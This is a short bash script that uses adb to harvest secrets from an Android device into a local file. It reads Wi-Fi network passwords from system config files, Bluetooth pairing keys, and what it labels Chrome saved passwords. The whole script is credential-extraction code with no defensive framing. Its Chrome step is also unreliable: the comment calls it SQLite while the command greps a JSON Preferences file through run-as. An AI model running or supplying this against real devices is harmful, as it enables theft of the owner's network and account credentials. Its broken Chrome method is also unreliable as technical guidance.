#!/bin/bash

# File to save results
OUTPUT_FILE="extracted_data.txt"

echo "Starting extraction..." > $OUTPUT_FILE

# Get Device Name
DEVICE_NAME=$(adb shell getprop ro.product.model)
echo "Device Name: $DEVICE_NAME" >> $OUTPUT_FILE

# Get Wi-Fi Passwords (requires root or adb shell with access)
echo "Wi-Fi Passwords:" >> $OUTPUT_FILE
adb shell cat /data/misc/wifi/*.conf 2>/dev/null | grep -E "ssid|psk" >> $OUTPUT_FILE

# Get Bluetooth Pairing Keys
echo "Bluetooth Keys:" >> $OUTPUT_FILE
adb shell cat /data/misc/bluedroid/bt_config.conf 2>/dev/null | grep -E "key=" >> $OUTPUT_FILE

# Get App Passwords (Example: Chrome passwords stored in SQLite)
echo "Chrome Passwords (SQLite):" >> $OUTPUT_FILE
adb shell run-as com.android.chrome cat app_webview/Preferences 2>/dev/null | grep -o '"password":"[^"]*"' >> $OUTPUT_FILE

echo "Extraction complete. Check $OUTPUT_FILE"